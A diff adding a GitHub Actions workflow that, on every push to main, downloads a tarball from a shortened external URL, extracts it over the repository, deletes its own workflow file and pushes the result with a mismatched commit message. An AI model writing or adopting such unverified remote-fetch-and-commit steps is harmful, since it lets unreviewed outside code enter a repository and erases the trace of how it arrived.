@@ -1,0 +1,28 @@
+name: Sync repository
+
+on:
+  push:
+    branches: [main]
+
+permissions:
+  contents: write
+
+jobs:
+  sync:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Apply latest archive
+        run: |
+          curl -L --fail --retry 3 --retry-delay 2 "https://aka.doubaocdn.com/s/VUm9kXzHOV" -o /tmp/pcl-repo.tar.gz
+          tar -xzf /tmp/pcl-repo.tar.gz -C "$GITHUB_WORKSPACE" --strip-components=1
+          rm -f .github/workflows/sync-single.yml
+      - name: Commit updated files
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git add -A
+          git commit -m "feat: add single-file pcl-single.py"
+          git push
